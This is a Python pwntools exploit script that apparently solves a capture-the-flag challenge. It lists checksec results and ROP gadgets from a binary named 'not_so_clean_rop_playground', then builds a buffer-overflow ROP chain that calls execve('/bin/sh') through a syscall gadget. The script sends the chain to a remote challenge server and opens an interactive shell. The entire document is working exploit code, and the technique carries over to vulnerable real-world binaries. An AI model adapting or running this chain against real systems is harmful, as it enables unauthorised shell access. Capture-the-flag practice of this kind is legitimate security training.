'''CHECKSEC
Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
'''

from pwn import *
DEBUG = 0
data_size = 32
rbp = 8
binaryname="./not_so_clean_rop_playground"
bin_sh_addr = 0x404040 + 31

if DEBUG == 1:
    context.log_level = "debug"
    
context.binary = exe = ELF(binaryname)
rop = ROP(exe)

'''
for addr, gadget in rop.gadgets.items():
    print(hex(addr), gadget.insns)
    
IT RETURNS:
    0x401017 ['add esp, 8', 'ret']
    0x401016 ['add rsp, 8', 'ret']
    0x4011c5 ['leave', 'ret']
    0x40117f ['pop r14', 'pop rcx', 'ret']
    0x40117e ['pop rax', 'pop r14', 'pop rcx', 'ret'] NEEDED
    0x40115d ['pop rbp', 'ret']
    0x401184 ['pop rcx', 'pop rdx', 'ret']
    0x401181 ['pop rcx', 'ret']
    0x401183 ['pop rdi', 'pop rcx', 'pop rdx', 'ret'] NEEDED
    0x401185 ['pop rdx', 'ret']
    0x401180 ['pop rsi', 'pop rcx', 'ret']    
    0x401187 ['pop rsi', 'ret']    NEEDED
    0x40101a ['ret']    MAYBE
    0x401189 ['syscall']    NEEDED
'''
rax = 0x40117e 
second_part = 0x401183
rsi = 0x401187
scall = 0x401189

payload = b"A"*32
payload += b"B"*8
payload += p64(rax)
payload += p64(59)
payload += p64(0)
payload += p64(0)
payload += p64(second_part)
payload += p64(bin_sh_addr)
payload += p64(0)
payload += p64(0)
payload += p64(rsi)
payload += p64(0)
payload += p64(scall)

#p = process(binaryname)
p = remote("cyberchallenge.diag.uniroma1.it", "5207")
p.recvuntil('>')
p.send(payload)
p.interactive()